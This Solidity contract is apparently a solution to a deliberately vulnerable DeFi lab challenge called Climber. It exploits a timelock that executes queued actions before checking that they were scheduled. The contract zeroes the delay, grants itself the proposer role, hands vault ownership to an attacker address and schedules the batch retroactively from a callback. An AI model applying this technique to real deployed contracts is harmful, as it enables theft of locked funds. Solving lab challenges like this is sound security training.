// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../climber/ClimberVault.sol";
import "../climber/ClimberTimelock.sol";

import "hardhat/console.sol";

contract AttackClimber {
    ClimberVault vault;
    ClimberTimelock timelock;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt;
    address attacker;

    constructor(address _vault, address _timelock, address _attacker) {
        vault = ClimberVault(_vault);
        timelock = ClimberTimelock(payable(_timelock));
        attacker = _attacker;
    }

    function attack() public {
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("updateDelay(uint64)", uint64(0))
        );

        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        targets.push(address(vault));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("transferOwnership(address)", attacker)
        );

        dataElements.push(abi.encodeWithSignature("schedule()"));
        values.push(0);
        targets.push(address(this));

        salt = keccak256("salt");

        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() public {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
